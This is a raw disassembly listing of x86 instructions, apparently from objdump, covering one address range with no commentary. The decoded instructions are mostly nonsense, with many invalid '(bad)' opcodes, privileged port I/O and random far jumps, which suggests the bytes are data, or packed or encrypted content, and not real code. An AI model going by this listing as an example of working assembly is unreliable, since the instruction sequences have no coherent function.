  426a81:	adc    eax,0x159e02ec
  426a86:	mov    bl,0xd1
  426a88:	outs   dx,DWORD PTR ds:[esi]
  426a89:	xchg   DWORD PTR [edx],eax
  426a8b:	ret    0x7c56
  426a8e:	fdiv   DWORD PTR [edi+0x18]
  426a91:	or     bh,cl
  426a93:	push   0xd259dfec
  426a98:	or     BYTE PTR [edx],0x51
  426a9b:	aaa    
  426a9c:	push   ds
  426a9d:	iret   
  426a9e:	jno    0x426b13
  426aa0:	popa   
  426aa1:	(bad)  
  426aa2:	jecxz  0x426a64
  426aa4:	ror    DWORD PTR [ecx],cl
  426aa6:	stos   DWORD PTR es:[edi],eax
  426aa7:	test   edx,ebp
  426aa9:	push   ss
  426aaa:	pushf  
  426aab:	(bad)  
  426aac:	mov    ebx,0x6a3dae34
  426ab1:	retf   0xbfff
  426ab4:	inc    esi
  426ab5:	inc    ecx
  426ab6:	addr16 cmp ebp,esp
  426ab9:	lods   al,BYTE PTR ds:[esi]
  426aba:	pushf  
  426abb:	test   al,0x61
  426abd:	mov    cl,BYTE PTR [edx]
  426abf:	push   ecx
  426ac0:	push   ds
  426ac1:	push   0xd8285835
  426ac6:	xor    eax,0x952eaa98
  426acb:	test   DWORD PTR [ebx+0x3c042098],edx
  426ad1:	push   0xffffffef
  426ad3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ad4:	push   eax
  426ad5:	data16 jne 0x426b45
  426ad8:	imul   al
  426ada:	xor    edi,DWORD PTR [edi+0x6e]
  426add:	loope  0x426b39
  426adf:	dec    edx
  426ae0:	xchg   ecx,eax
  426ae1:	jno    0x426a88
  426ae3:	pop    es
  426ae4:	push   0xbfd492eb
  426ae9:	mov    edx,0xba5ed960
  426aee:	outs   dx,BYTE PTR ds:[esi]
  426aef:	sbb    dl,BYTE PTR ss:[ebp+0x32f864bc]
  426af6:	dec    ebx
  426af7:	cmp    BYTE PTR [ebx],0xcf
  426afa:	stc    
  426afb:	jmp    0x3707ddef
  426b00:	add    DWORD PTR [esi-0x702f1087],edx
  426b06:	xlat   BYTE PTR ds:[ebx]
  426b07:	xchg   edx,eax
  426b08:	or     BYTE PTR [ecx-0x41],0x5e
  426b0c:	ins    DWORD PTR es:[edi],dx
  426b0d:	out    dx,al
  426b0e:	inc    esi
  426b0f:	jle    0x426b50
  426b11:	lock sahf 
  426b13:	js     0x426af8
  426b15:	test   DWORD PTR [eax-0x6c],edi
  426b18:	dec    esp
  426b19:	imul   ebp,DWORD PTR [ebx-0x32da3b80],0x34
  426b20:	mov    esp,0x13bc44b0
  426b25:	dec    eax
  426b26:	arpl   WORD PTR [esi],sp
  426b28:	retf   0x2373
  426b2b:	das    
  426b2c:	sbb    BYTE PTR [esi-0x5a],0x3a
  426b30:	(bad)  [esi+esi*1+0x5d20fe1a]
  426b37:	arpl   sp,di
  426b39:	cwde   
  426b3a:	pop    ebx
  426b3b:	xchg   ebp,eax
  426b3c:	or     bl,BYTE PTR [ebx+0x5e]
  426b3f:	ret    0xe924
  426b42:	sbb    eax,0x767c7831
  426b47:	dec    edi
  426b48:	rcr    dh,1
  426b4a:	mov    dl,0x9b
  426b4c:	xor    al,0x7a
  426b4e:	popa   
  426b4f:	(bad)  
  426b51:	jb     0x426b13
  426b53:	mov    dh,0x45
  426b55:	adc    cl,BYTE PTR [eax+eiz*1-0x66282492]
  426b5c:	dec    eax
  426b5d:	xlat   BYTE PTR ds:[ebx]
  426b5e:	adc    DWORD PTR [edx+eiz*1],ecx
  426b61:	xor    BYTE PTR [ebx],0xdb
  426b64:	loop   0x426af4
  426b66:	xor    ah,cl
  426b68:	or     edx,DWORD PTR [edi-0x206f4632]
  426b6e:	sbb    bh,BYTE PTR [ebp+0x13cae7fa]
  426b74:	ret    
  426b75:	sahf   
  426b76:	sbb    al,0x3b
  426b78:	jb     0x426b77
  426b7a:	mov    eax,ds:0x5c5a410a
  426b7f:	xchg   edi,eax
  426b80:	les    ecx,FWORD PTR [eax+0x0]
  426b83:	mov    ebx,0x79bcb6a4
  426b88:	or     ebp,DWORD PTR [ebp+0x6d]
  426b8b:	cdq    
  426b8c:	mov    ds:0x6431c709,al
  426b91:	push   ds
  426b92:	jg     0x426b40
  426b94:	je     0x426b17
  426b96:	dec    esp
  426b97:	fcom   DWORD PTR [ebp-0x72cc4e74]
  426b9d:	aam    0x0
  426b9f:	adc    BYTE PTR [ebx-0x1e],0x56
  426ba3:	push   ds
  426ba4:	push   ebp
  426ba5:	sbb    esp,esi
  426ba7:	pop    ss
  426ba8:	sar    BYTE PTR [ebx-0x67],0xdf
  426bac:	add    ah,bl
  426bae:	pop    ss
  426baf:	shl    BYTE PTR [ecx-0x21e85484],cl
  426bb5:	sub    edi,esi
  426bb7:	sbb    esp,DWORD PTR [ebp-0x4a]
  426bba:	or     DWORD PTR [esi],ecx
  426bbc:	and    eax,0x8b35d8ef
  426bc1:	sti    
  426bc2:	enter  0x9a13,0x9e
  426bc6:	sbb    BYTE PTR [eax-0x66],bh
  426bc9:	add    DWORD PTR [ebx-0x3d],ecx
  426bcc:	cmp    esi,DWORD PTR [ecx-0x92c9d8f]
  426bd2:	inc    edx
  426bd3:	jmp    0x2e372860
  426bd8:	xor    bl,ch
  426bda:	std    
  426bdb:	adc    bh,dl
  426bdd:	jg     0x426bcb
  426bdf:	cmp    eax,0x598547fe
  426be4:	int    0xbc
  426be6:	and    al,0x58
  426be8:	cmp    al,0x5b
  426bea:	call   0x14a9:0xbfad3066
  426bf1:	test   DWORD PTR [edx+ecx*8],0x713b3f75
  426bf8:	and    ebp,DWORD PTR [ecx-0x57]
  426bfb:	loope  0x426b81
  426bfd:	mov    WORD PTR [esi+0x7a],ds
  426c00:	call   0x4e0b:0xb9e2f5cd
  426c07:	ins    DWORD PTR es:[edi],dx
  426c08:	pop    esi
  426c09:	jae    0x426bbe
  426c0b:	push   esi
  426c0c:	dec    edi
  426c0d:	push   ebp
  426c0e:	ins    BYTE PTR es:[edi],dx
  426c0f:	mov    BYTE PTR [eax+0x649b103a],bl
  426c15:	ja     0x426bcb
  426c17:	outs   dx,DWORD PTR ds:[esi]
  426c18:	std    
  426c19:	push   es
  426c1a:	jl     0x426c26
  426c1c:	and    BYTE PTR [ebx],0x82
  426c1f:	mov    DWORD PTR [ebx+0x3cdbec4b],edi
  426c25:	je     0x426bd7
  426c27:	arpl   WORD PTR [esi-0x74],di
  426c2a:	push   ss
  426c2b:	out    0x4a,eax
  426c2d:	outs   dx,BYTE PTR ds:[esi]
  426c2e:	nop
  426c2f:	mov    eax,ds:0x440c31cf
  426c34:	mov    BYTE PTR [edi-0x5fe4b5cb],bl
  426c3a:	addr16 inc edx
  426c3c:	scas   al,BYTE PTR es:[edi]
  426c3d:	in     eax,dx
  426c3e:	dec    edx
  426c3f:	mov    dh,0x1a
  426c41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c42:	jo     0x426bd6
  426c44:	test   al,0x93
  426c46:	jo     0x426c93
  426c48:	in     al,0x59
  426c4a:	inc    esi
  426c4b:	mov    bl,BYTE PTR [eax+0x2b8e4315]
  426c51:	test   eax,0x64101801
  426c56:	push   es
  426c57:	int    0x7
  426c59:	dec    ecx
  426c5a:	fld    st(2)
  426c5c:	xchg   edi,eax
  426c5d:	mov    eax,0x65871431
  426c62:	sbb    eax,ecx
  426c64:	mov    al,ds:0xbd2b853f
  426c69:	jmp    0x4785:0x7926adbd
  426c70:	ret    0x105f
  426c73:	jl     0x426c04
  426c75:	jle    0x426c47
  426c77:	adc    BYTE PTR [ecx],0xce
  426c7a:	jl     0x426c4f
  426c7c:	inc    ebp
  426c7d:	aam    0x6b
  426c7f:	or     al,0x3e
  426c81:	(bad)  
  426c82:	arpl   dx,dx
  426c84:	jecxz  0x426c7b
  426c86:	in     eax,dx
  426c87:	dec    edx
  426c88:	sbb    ecx,DWORD PTR [esi-0x29989a82]
  426c8e:	popf   
  426c8f:	inc    edx
  426c90:	int    0x20
  426c92:	inc    ebx
  426c93:	and    DWORD PTR [ecx],eax
  426c95:	inc    edx
  426c96:	jp     0x426c33
  426c98:	out    0x46,al
  426c9a:	push   ds
  426c9b:	daa    
  426c9c:	sar    BYTE PTR gs:[ebp+ecx*1-0x3841cd03],1
  426ca4:	neg    BYTE PTR [ebp+0x56c61946]
  426caa:	xor    BYTE PTR [edi+0x2f7ebead],bh
  426cb0:	icebp  
  426cb1:	sbb    eax,0x1415f94c
  426cb6:	lock mov BYTE PTR [edx+0x7f6aac54],ch
  426cbd:	add    al,0x96
  426cbf:	fcom   st(6)
  426cc1:	mov    eax,ds:0x85a8f42a
  426cc6:	lods   al,BYTE PTR ds:[esi]
  426cc7:	jg     0x426cbb
  426cc9:	mov    dh,bl
  426ccb:	dec    ebp
  426ccc:	push   edi
  426cce:	pushf  
  426ccf:	dec    esp
  426cd0:	adc    BYTE PTR ds:0xf2691810,bl
  426cd6:	push   es
  426cd7:	mov    esp,0x3c494856
  426cdc:	mov    ?,WORD PTR [ecx-0x218ce11f]
  426ce2:	ret    
  426ce3:	bound  esi,QWORD PTR [ecx-0x6f]
  426ce6:	into   
  426ce7:	sti    
  426ce8:	inc    ebp
  426ce9:	out    dx,al
  426cea:	lds    edx,FWORD PTR [ecx+edx*8+0x6]
  426cee:	data16 mov ch,0x4f
  426cf1:	push   es
  426cf2:	mov    DWORD PTR [edx],0x908b3e3f
  426cf8:	scas   eax,DWORD PTR es:[edi]
  426cf9:	add    BYTE PTR [eax],al
  426cfb:	add    BYTE PTR [eax+0x23],ch
  426cfe:	sub    eax,0x7b1e6f1e
  426d03:	ja     0x426ce3
  426d05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d06:	ss mov al,0x62
  426d09:	mov    eax,ebx
  426d0b:	paddb  mm4,mm4
  426d0e:	add    DWORD PTR [eax],eax
  426d10:	test   DWORD PTR [edx],eax
  426d12:	add    BYTE PTR [eax],al
  426d14:	mov    esi,0x4ce04e73
  426d19:	cdq    
  426d1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d1b:	out    dx,al
  426d1c:	lea    esi,[edx]
  426d1e:	popf   
  426d1f:	push   edx
  426d20:	imul   edi,edx,0x984c5f37
  426d26:	loopne 0x426d22
  426d28:	xchg   ebx,eax
  426d29:	add    eax,0xc7b56a79
  426d2e:	inc    eax
  426d2f:	pushf  
  426d30:	cmp    bl,BYTE PTR [edi]
  426d32:	int3   
  426d33:	or     ch,bh
  426d35:	pop    ss
  426d36:	fwait
  426d37:	enter  0x25e1,0x0
  426d3b:	jae    0x426d23
  426d3d:	mov    eax,0x2eab56ab
  426d42:	cmp    al,0x76
  426d44:	and    eax,0x69db418b
  426d49:	pop    ss
  426d4a:	sar    BYTE PTR [edx],1
  426d4c:	inc    edx
  426d4d:	mov    al,0xe7
  426d4f:	nop
  426d50:	xor    al,0x4
  426d52:	mov    fs,esp
  426d54:	xchg   ebx,eax
  426d55:	aas    
  426d56:	push   cs
  426d57:	mov    ch,0x68
  426d59:	jnp    0x426dae
  426d5b:	and    BYTE PTR ds:0x8c466e98,al
  426d61:	jp     0x426d8c
  426d63:	and    al,0x55
  426d65:	push   esi
  426d66:	in     eax,dx
  426d67:	xor    eax,0xe86368ea
  426d6c:	jae    0x426d2f
  426d6e:	shr    ebx,cl
  426d70:	jp     0x426d5f
  426d72:	xchg   ecx,eax
  426d73:	sahf   
  426d74:	mov    ch,0x2c
  426d76:	clc    
  426d77:	push   0x56461339
  426d7c:	mov    esp,0xe70068ab
  426d81:	mov    edx,0xb5b6edd3
  426d86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d87:	leave  
  426d88:	repnz outs dx,BYTE PTR ds:[esi]
  426d8a:	lea    edx,[ebx+0x3ea72a95]
  426d90:	push   edx
  426d91:	popf   
  426d92:	jae    0x426d3d
  426d94:	cmp    BYTE PTR [eax+ebp*1],cl
  426d97:	jns    0x426db6
  426d99:	scas   eax,DWORD PTR es:[edi]
  426d9a:	stc    
  426d9b:	mov    bl,0xd0
  426d9d:	cli    
  426d9e:	push   ebx
  426d9f:	or     DWORD PTR [edx+0x7e],ecx
  426da2:	aaa    
  426da3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426da4:	jp     0x426db6
  426da6:	ret    
  426da7:	xor    cl,BYTE PTR fs:[esi]
  426daa:	jg     0x426dd0
  426dac:	or     al,0xb
  426dae:	or     eax,0xde41d449
  426db3:	jle    0x426e1f
  426db5:	into   
  426db6:	daa    
  426db7:	cli    
  426db8:	push   es
  426db9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426dba:	icebp  
  426dbb:	ins    BYTE PTR es:[edi],dx
  426dbc:	mov    ds:0xe508b496,al
  426dc1:	pop    edx
  426dc2:	adc    ebx,DWORD PTR [edx-0x60]
  426dc5:	jmp    0x56db:0xbf9a2bf0
  426dcc:	dec    eax
  426dcd:	dec    esi
  426dce:	neg    BYTE PTR [ebp-0x60aaf93b]
  426dd4:	arpl   WORD PTR [ecx+0x2dc4318b],bp
  426dda:	xor    edi,DWORD PTR [eax-0x5f]
  426ddd:	ins    DWORD PTR es:[edi],dx
  426dde:	nop
  426ddf:	xchg   BYTE PTR [esi],al
  426de1:	sbb    BYTE PTR [ecx-0x3044c800],ah
  426de7:	les    esp,FWORD PTR [edx+esi*4+0x49]
  426deb:	loopne 0x426e3e
  426ded:	sti    
  426dee:	and    DWORD PTR ds:0xd3c31590,0xffffffe9
  426df5:	ins    DWORD PTR es:[edi],dx
  426df6:	mov    dh,0x7
  426df8:	iret   
  426df9:	inc    ebx
  426dfa:	out    0x61,al
  426dfc:	and    ecx,0xb5ed86fc
  426e02:	sbb    dl,0x4e
  426e05:	loope  0x426e2c
  426e07:	ret    
  426e08:	add    BYTE PTR [esp+esi*8],ch
  426e0b:	inc    edi
  426e0c:	and    DWORD PTR [eax+ecx*4+0x3abde92c],ecx
  426e13:	scas   eax,DWORD PTR es:[edi]
  426e14:	adc    DWORD PTR [eax-0x56],ebx
  426e17:	fidiv  DWORD PTR [ebx]
  426e19:	jmp    0x426df8
  426e1b:	sbb    BYTE PTR [edx+0x21],ch
  426e1e:	(bad)  
  426e1f:	push   0x17889e5a
  426e24:	imul   ebp,DWORD PTR [esi*1+0x34784d6b],0xffffffa6
  426e2c:	add    eax,0x7a06a8cd
  426e31:	jge    0x426dbf
  426e33:	dec    esi
  426e34:	xor    al,0xc7
  426e36:	jnp    0x426dd3
  426e38:	out    dx,eax
  426e39:	popf   
  426e3a:	(bad)  [esi-0x275c7458]
  426e40:	in     eax,dx
  426e41:	fsub   QWORD PTR [ebx-0x33ea5db7]
  426e47:	dec    edi
  426e48:	inc    esp
  426e49:	and    eax,0xe03527aa
  426e4e:	fwait
  426e4f:	xchg   esp,eax
  426e50:	fisubr DWORD PTR [ecx+eiz*8+0x5581d53c]
  426e57:	int    0x68
  426e59:	dec    eax
  426e5a:	enter  0x7735,0x43
  426e5e:	in     eax,dx
  426e5f:	div    BYTE PTR [ebp+0x1b]
  426e62:	push   esp
  426e63:	(bad)  
  426e64:	data16 sbb dl,ch
  426e67:	fimul  WORD PTR [ebx]
  426e69:	repz cmp eax,0x8db76c3b
  426e6f:	sbb    DWORD PTR [ecx-0xd],0xffffffa0
  426e73:	scas   eax,DWORD PTR es:[edi]
  426e74:	scas   al,BYTE PTR es:[edi]
  426e75:	mov    esi,0xfd3eece6
  426e7a:	mov    ds:0xb639743e,al
  426e7f:	and    DWORD PTR [eax],ecx
  426e81:	sub    DWORD PTR [ecx+0x313bc8f],esp
  426e87:	sar    BYTE PTR [eax-0x5f],1
  426e8a:	pinsrw mm5,WORD PTR [eax],0xff
  426e8e:	and    eax,0xbbf5f8e8
  426e93:	out    dx,eax
  426e94:	aas    
  426e95:	mov    bh,0xe4
  426e97:	mov    eax,0x8feabc40
  426e9c:	mov    ebp,0xacf89cb3
  426ea1:	push   edx
  426ea2:	jle    0x426e7d
  426ea4:	and    esi,DWORD PTR [ebx]
  426ea6:	mov    ebx,0xacbb12e5
  426eab:	sbb    DWORD PTR [ebx],0xeeabb3d6
  426eb1:	sub    eax,0x8e073fc8
  426eb6:	mov    esp,eax
  426eb8:	out    0x17,al
  426eba:	iret   
  426ebb:	scas   eax,DWORD PTR es:[edi]
  426ebc:	aad    0xdf
  426ebe:	jne    0x426f29
  426ec0:	mov    esp,0x94c57d37
  426ec5:	int    0x37
  426ec7:	mov    al,ds:0xdcc6f7e5
  426ecc:	inc    eax
  426ecd:	mov    ds:0x762a7a44,eax
  426ed2:	out    0x56,al
  426ed4:	cdq    
  426ed5:	pop    es
  426ed6:	adc    eax,0xa493bbbd
  426edb:	dec    ebp
  426edc:	xor    DWORD PTR [eax+0x3d6dc715],eax
  426ee2:	fsubrp st(2),st
  426ee4:	(bad)  
  426ee5:	jg     0x426e92
  426ee7:	jns    0x426e80
  426ee9:	or     bl,BYTE PTR gs:[esi+ecx*8-0x6e252934]
  426ef1:	fwait
  426ef2:	xlat   BYTE PTR ds:[ebx]
  426ef3:	xchg   BYTE PTR [edi],ch
  426ef5:	ficom  WORD PTR [edi]
  426ef7:	mov    cs,WORD PTR [edx-0x3f8c959a]
  426efd:	mov    ecx,0xb629af52
  426f02:	jns    0x426ec0
  426f04:	jmp    FWORD PTR [ebp-0x64]
  426f07:	dec    esp
  426f08:	retf   
  426f09:	aam    0xb7
  426f0b:	xor    ebp,DWORD PTR [ebx]
  426f0d:	pop    ebp
  426f0e:	clc    
  426f0f:	mov    DWORD PTR [esi+ebp*4-0x3c],0xcf4f1729
  426f17:	fs sahf 
  426f19:	mov    dl,0x38
  426f1b:	test   al,0xb6
  426f1d:	dec    esi
  426f1e:	(bad)  
  426f1f:	in     al,0x6e
  426f21:	inc    edi
  426f22:	mov    ecx,0xd70549dc
  426f27:	ds jge 0x426f49
  426f2a:	adc    edi,DWORD PTR [eax+0x24]
  426f2d:	mov    al,ds:0x323af774
  426f32:	mov    ebp,0x3d5cbbdd
  426f37:	jnp    0x426eee
  426f39:	xor    edx,DWORD PTR [ebx-0x51]
  426f3c:	or     bl,dh
  426f3e:	cmp    eax,0xc4a93b9d
  426f43:	xor    eax,0x56d8e992
  426f48:	pop    ds
  426f49:	out    0x55,al
  426f4b:	mov    edx,0x38a4d3df
  426f50:	sar    BYTE PTR [ecx],cl
  426f52:	adc    bh,BYTE PTR [edx]
  426f54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f55:	fist   WORD PTR [esi+0x7d]
  426f58:	lds    edi,FWORD PTR [edx+eax*1+0x79]
  426f5c:	mov    al,ds:0xe2f1124c
  426f61:	call   0xf73f:0x76a7fc99
  426f68:	jne    0x426fa0
  426f6a:	jo     0x426efd
  426f6c:	push   ebp
  426f6d:	mov    bl,ah
  426f6f:	shl    DWORD PTR ds:0xc16880bf,1
  426f75:	adc    BYTE PTR [ebx],dh
  426f77:	jmp    0x2fd56bb0
  426f7c:	enter  0xdeab,0xf5
  426f80:	leave  
  426f81:	adc    BYTE PTR [edx-0x5ba54ab2],al
  426f87:	pop    eax
  426f88:	inc    eax
  426f8a:	xchg   esi,eax
  426f8c:	test   al,0x74
  426f8e:	or     BYTE PTR [ebp-0x4d],ch
  426f91:	and    al,0x74
  426f93:	xchg   BYTE PTR [esi-0x6bde1206],dl
  426f99:	add    BYTE PTR [eax],al
  426f9b:	add    BYTE PTR [ecx-0x6600738],bl
  426fa1:	mov    edi,0xdf92ceff
  426fa6:	push   ds
  426fa7:	outs   dx,BYTE PTR ds:[esi]
  426fa8:	scas   eax,DWORD PTR es:[edi]
  426fa9:	cdq    
  426faa:	or     DWORD PTR [edi],0xffffff81
  426fad:	out    0x1,eax
  426faf:	add    BYTE PTR [ebp+0x6b000002],al
  426fb5:	sub    esi,DWORD PTR [eax+0x3c117f33]
  426fbb:	nop
  426fbc:	js     0x426ff1
  426fbe:	xchg   BYTE PTR ds:0x555d02b6,cl
  426fc4:	data16 (bad) [ecx+ebp*2]
  426fc8:	dec    ebx
  426fc9:	out    0xbb,eax
  426fcb:	add    bh,BYTE PTR [ebp-0x23]
  426fce:	pop    es
  426fcf:	test   al,0x2a
  426fd1:	or     eax,0xc9cdb3ab
  426fd6:	aaa    
  426fd7:	iret   
  426fd8:	pop    esp
  426fd9:	cmp    BYTE PTR [ecx-0x4abb345a],cl
  426fdf:	push   ds
  426fe0:	dec    edx
  426fe1:	into   
  426fe2:	jns    0x426fe1
  426fe4:	pop    edi
  426fe5:	cmp    eax,0x1d847d89
  426fea:	not    cl
  426fec:	enter  0xddcf,0x54
  426ff0:	nop
  426ff1:	sub    ecx,esi
  426ff3:	arpl   WORD PTR [esi],dx
  426ff5:	cld    
  426ff6:	scas   eax,DWORD PTR es:[edi]
  426ff7:	xor    al,0x29
  426ff9:	mov    dh,0x13
  426ffb:	out    0xc3,eax
  426ffd:	mov    esi,0x923a5f31
  427002:	mov    eax,0x66711dfe
  427007:	xor    DWORD PTR [ebx+0x12961fb8],esi
  42700d:	push   edx
  42700e:	xor    BYTE PTR [edi+0x21],bh
  427011:	fwait
  427012:	lods   al,BYTE PTR ds:[esi]
  427013:	mov    ebp,0x1f1e0154
  427018:	lock pop edi
  42701a:	or     eax,0x6178ab00
  42701f:	jmp    0x2cc1:0x1ae2ce02
  427026:	not    BYTE PTR [ebp+0x2f]
  427029:	and    eax,0x4e9b8f2c
  42702e:	mov    edx,0x1cb6b2a9
  427033:	jmp    0xb2812bef
  427038:	ds les ebx,FWORD PTR cs:0x831a1c97
  427040:	xor    BYTE PTR [eax-0x23],bh
  427043:	cmp    esi,DWORD PTR [ebx+0x5d]
  427046:	std    
  427047:	inc    ebx
  427048:	adc    dl,ah
  42704a:	push   ebx
  42704b:	or     DWORD PTR [edx+ecx*2],0x7f516bf
  427052:	xchg   esi,eax
  427053:	push   edi
  427054:	jmp    0x893a:0x52c9dcb6
  42705b:	(bad)  
  42705c:	(bad)  [ebx+0xc37ce97]
  427062:	sbb    BYTE PTR [edi],bh
  427064:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427065:	adc    eax,0xdfb98b20
  42706a:	sbb    eax,0x17dab5d9
  42706f:	ins    DWORD PTR es:[edi],dx
  427070:	adc    DWORD PTR [edx-0x3d128ed6],esp
  427076:	push   ebx
  427077:	push   esi
  427078:	sti    
  427079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42707a:	sub    al,0x18
  42707c:	mov    ds:0x977d7011,al
  427081:	daa    
  427082:	xchg   BYTE PTR [ebp+eiz*1+0x15727e14],cl
  427089:	mov    eax,0xfbdd94cf
  42708e:	out    dx,eax
  42708f:	(bad)  
  427090:	out    dx,al
  427091:	push   cs
  427092:	add    al,0xb8
  427094:	retf   0xd31f
  427097:	cmp    BYTE PTR [edx+eax*4],ah
  42709a:	mov    eax,ds:0x38a33820
  42709f:	mov    esi,0xcd5ccbce
  4270a4:	xchg   DWORD PTR [edx+ebx*1-0xd12f214],esp
  4270ab:	(bad)  
  4270ac:	repz lea ecx,[ebp+0x6b5a3bfd]
  4270b3:	mov    dh,0xb5
  4270b5:	and    DWORD PTR [ecx+0x7b],esi
  4270b8:	mov    eax,?
  4270ba:	(bad)  
  4270bb:	icebp  
  4270bc:	push   edi
  4270bd:	jmp    0x345c:0x9999a647
  4270c4:	adc    DWORD PTR [ecx+0x2dbacf5e],ebx
  4270ca:	jne    0x42706a
  4270cc:	jge    0x427092
  4270ce:	hlt    
  4270cf:	pop    ecx
  4270d0:	cmp    dl,bh
  4270d2:	pushf  
  4270d3:	mov    cl,0x68
  4270d5:	inc    edx
  4270d6:	mov    esi,0x4393a927
  4270db:	fidiv  WORD PTR [edi-0x36ba72cf]
  4270e1:	dec    ebp
  4270e2:	push   esp
  4270e3:	cmc    
  4270e4:	jns    0x42711e
  4270e6:	outs   dx,DWORD PTR es:[esi]
  4270e8:	stos   BYTE PTR es:[edi],al
  4270e9:	lea    ecx,[esi+edx*2]
  4270ec:	rol    DWORD PTR [ecx+0x4c1ce50e],0xb3
  4270f3:	clc    
  4270f4:	mov    ecx,0xab6e98ff
  4270f9:	scas   eax,DWORD PTR es:[edi]
  4270fa:	push   esi
  4270fb:	sar    DWORD PTR [ecx],cl
  4270fd:	dec    esp
  4270fe:	jl     0x427130
  427100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427101:	mov    DWORD PTR [edx+0x4a],edx
  427104:	ret    
  427105:	mov    ds:0x70223392,eax
  42710a:	jmp    0x427170
  42710c:	xor    edi,ebx
  42710e:	out    0x8,eax
  427110:	clc    
  427111:	pop    edx
  427112:	add    al,0x5a
  427114:	or     eax,DWORD PTR [ebp-0x1583b7db]
  42711a:	push   esp
  42711b:	mov    fs,WORD PTR [ebx+eiz*2]
  42711e:	popf   
  42711f:	leave  
  427120:	mov    dl,0x76
  427122:	pop    ebp
  427123:	ss fdiv st,st(5)
  427126:	pop    edi
  427127:	bound  ebx,QWORD PTR [edi-0x70dbe598]
  42712d:	xchg   ebp,eax
  42712e:	inc    ecx
  42712f:	fnstsw WORD PTR [ebx+0x41]
  427132:	jne    0x42718b
  427134:	stos   DWORD PTR es:[edi],eax
  427135:	(bad)  
  427136:	(bad)  
  427137:	jg     0x4270e1
  427139:	rol    ebx,0xe6
  42713c:	push   0x671084c7
  427141:	in     eax,dx
  427142:	and    dl,BYTE PTR [edx]
  427144:	inc    esi
  427145:	es pop ebx
  427147:	mov    WORD PTR [ecx],ds
  427149:	mov    dl,0x9c
  42714b:	adc    ah,BYTE PTR es:[esi]
  42714e:	mov    dl,0xfd
  427150:	adc    al,0xdc
  427152:	cmp    eax,DWORD PTR [ebp+0x2f]
  427155:	rcl    edx,cl
  427157:	popf   
  427158:	fdivr  DWORD PTR [eax+edx*8+0x49]
  42715c:	jmp    0xa0b5:0xf100acad
  427163:	mov    edi,0xfdd3d6ff
  427168:	in     eax,dx
  427169:	mov    ds:0x54a105e3,al
  42716e:	idiv   DWORD PTR [edi-0x33550a13]
  427174:	cmc    
  427175:	retf   
  427176:	stos   DWORD PTR es:[edi],eax
  427177:	jmp    0x4271db
  427179:	int3   
  42717a:	jne    0x4271ba
  42717c:	gs sub ecx,ebx
  42717f:	mov    al,0x6e
  427181:	stc    
  427182:	add    esi,DWORD PTR [eax]
  427184:	lods   eax,DWORD PTR ds:[esi]
  427185:	cmp    DWORD PTR [ebx-0x76358cf2],ebp
  42718b:	or     DWORD PTR [ebp-0x18],edi
  42718e:	pop    edx
  42718f:	add    DWORD PTR [ecx+0x49971c7d],ebp
  427195:	cmp    dh,bl
  427197:	dec    esi
  427198:	dec    eax
  427199:	out    0x54,eax
  42719b:	sbb    bl,BYTE PTR [ebx]
  42719d:	pop    ebp
  42719e:	aam    0x99
  4271a0:	jbe    0x42712c
  4271a2:	sub    al,0x13
  4271a4:	mov    ds:0x2cb56ea2,eax
  4271a9:	cdq    
  4271aa:	sub    eax,0x836b6eed
  4271af:	inc    BYTE PTR [esi+0x749a7558]
  4271b5:	and    ch,BYTE PTR [edx+0x2ac8186f]
  4271bb:	imul   eax,DWORD PTR [eax-0x21],0xffffffcc
  4271bf:	dec    ebx
  4271c0:	xor    BYTE PTR [ebx],0xd2
  4271c3:	into   
  4271c4:	mov    ebp,0xd1fd399e
  4271c9:	fcmovnbe st,st(3)
  4271cb:	pop    esi
  4271cc:	(bad)  
  4271cd:	in     al,dx
  4271ce:	dec    esp
  4271cf:	ret    
  4271d0:	add    al,0x42
  4271d2:	adc    eax,0xc54f81e6
  4271d7:	cmp    ebp,DWORD PTR [edx]
  4271d9:	jle    0x4271dc
  4271db:	inc    ebp
  4271dc:	add    al,0xf6
  4271de:	test   DWORD PTR [esi-0x78],0x6c4fb179
  4271e5:	out    dx,eax
  4271e6:	stc    
  4271e7:	dec    BYTE PTR [esi+0x20]
  4271ea:	fstp   QWORD PTR [esi-0x63]
  4271ed:	jae    0x427247
  4271ef:	out    0x53,eax
  4271f1:	inc    ebp
  4271f2:	cli    
  4271f3:	pushf  
  4271f4:	test   ebx,edx
  4271f6:	(bad)  
  4271f7:	dec    ebx
  4271f8:	mov    esp,0xc6a70bc7
  4271fd:	dec    ebp
  4271fe:	dec    ebp
  4271ff:	int    0x72
  427201:	loope  0x42722c
  427203:	out    dx,al
  427204:	aaa    
  427205:	xchg   DWORD PTR [edi],ebp
  427207:	push   ds
  427208:	out    dx,eax
  427209:	ss in  al,0x64
  42720c:	or     al,0xb4
  42720e:	stos   DWORD PTR es:[edi],eax
  42720f:	cli    
  427210:	push   esp
  427211:	mov    dh,BYTE PTR ds:0x5971b989
  427217:	mov    edi,ebp
  427219:	pop    ebp
  42721a:	les    edi,FWORD PTR [esi+0x710eeb95]
  427220:	idiv   BYTE PTR [edx+0x70b8e970]
  427226:	into   
  427227:	cmp    ecx,edx
  427229:	xor    cl,BYTE PTR [ecx-0x3c6fd793]
  42722f:	aas    
  427230:	clc    
  427231:	cmp    BYTE PTR [ecx-0x483dffb8],0xab
  427238:	or     BYTE PTR [eax],al
  42723a:	add    BYTE PTR [eax],al
  42723c:	jns    0x427248
  42723e:	sbb    BYTE PTR gs:[edi+0x7f],dh
  427242:	jge    0x4272af
  427244:	int3   
  427245:	outs   dx,BYTE PTR ds:[esi]
  427246:	xchg   esi,esi
  427248:	push   0x63190fd
  42724d:	jmp    0x0:0x2850001
  427254:	or     BYTE PTR [esi-0x7222e82e],bl
  42725a:	jge    0x42721e
  42725c:	inc    esi
  42725d:	inc    esp
  42725e:	mov    ah,0x2
  427260:	cmp    dh,BYTE PTR [edi+0x19]
  427263:	loopne 0x42729e
  427265:	je     0x427246
  427267:	pop    es
  427268:	add    ebx,eax
  42726a:	pushf  
